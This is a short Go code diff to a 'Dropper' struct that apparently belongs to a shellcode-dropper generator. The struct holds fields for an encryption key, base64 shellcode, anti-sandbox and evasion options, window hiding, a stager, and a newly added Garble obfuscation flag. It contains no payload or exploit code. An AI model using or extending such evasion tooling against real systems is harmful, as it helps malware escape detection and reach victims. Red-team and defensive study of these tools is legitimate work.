@@ -10,6 +10,7 @@ type Dropper struct {
 	FileName string //Filename (useful for output)
 	KeyStr   string //EncryptionKey
 	BufStr   string //Base64Shellcodestr
+	Debug    bool   //determines if dropper files will be kept after write.
 
 	//Template Specific
 	Dtype  string
@@ -20,7 +21,6 @@ type Dropper struct {
 	Extra  string
 	Arch   bool
 	MemCom string
-	Debug  bool //determines if dropper files will be kept after write.
 
 	//AntiSandbox/Evasion
 	BoxChkFunc string
@@ -31,6 +31,7 @@ type Dropper struct {
 	BlockNonMs string
 	LeetImp    string
 	Hide       string //Hide window
+	Garble     bool
 
 	//Stager
 	Stager       string
